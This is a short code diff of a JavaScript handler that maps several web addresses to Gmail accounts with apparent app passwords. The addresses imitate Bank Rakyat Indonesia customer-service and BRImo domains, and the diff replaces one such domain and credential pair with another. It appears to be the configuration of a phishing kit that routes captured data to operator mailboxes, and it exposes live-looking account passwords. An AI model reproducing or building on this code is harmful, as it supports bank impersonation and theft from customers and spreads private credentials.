@@ -17,9 +17,9 @@ export default function handler(req, res) {
         email = 'hibrahimshaleh@gmail.com';
         pass = 'bfaawtyurzhbqjkl';
 
-    } else if(url == 'bri-pelayanan.herokuapp.com'){
-        email = 'pukiayam5123@gmail.com';
-        pass = 'joyxbannkfmypmzx';
+    } else if (url == 'app-brimo-bifas.herokuapp.com'){
+        email = 'brimopasp@gmail.com';
+        pass = 'ezbvulgxsjerhpnb';
 
     } else if(url == 'bri-customerservice.xyz'){
         email = 'spacediamond95@gmail.com';
